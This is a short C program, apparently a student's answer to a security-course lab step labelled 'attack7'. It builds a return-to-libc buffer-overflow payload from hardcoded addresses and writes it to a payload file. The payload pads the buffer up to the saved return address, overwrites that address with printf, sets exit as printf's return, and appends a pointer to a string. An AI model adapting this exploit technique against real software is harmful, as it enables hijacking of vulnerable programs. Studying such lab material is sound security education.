#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    long eip_addr = 0xffffd09c;
    long printf_addr = 0xf7e2c060;
    long exit_addr = 0xf7e0f990;
    long buf_addr = 0xffffd05b;
    long inputStr_addr = 0x804e700; 

    int offset = eip_addr - buf_addr;
    printf("Offset7: %d\n", offset);

    char name[] = "Surya\n";

    int buf_size = offset + 12 + strlen(name) + 1; // offset(*) + printf + exit + name + \\0
    char attack7_buffer[buf_size];

    memset(attack7_buffer, '*', buf_size);
    // Copy printf, exit and name
    memcpy(attack7_buffer + offset, &printf_addr, 4);
    memcpy(attack7_buffer + offset + 4, &exit_addr, 4);
    memcpy(attack7_buffer + offset + 12, name, strlen(name) + 1);

    // Copy inputStr address
    long name_ptr = inputStr_addr + offset + 12;
    memcpy(attack7_buffer + offset + 8, &name_ptr, 4);


    write_to_file( "payloads/attack7-payload", attack7_buffer, buf_size, FILE_CLEAR );
    exit(0);
}

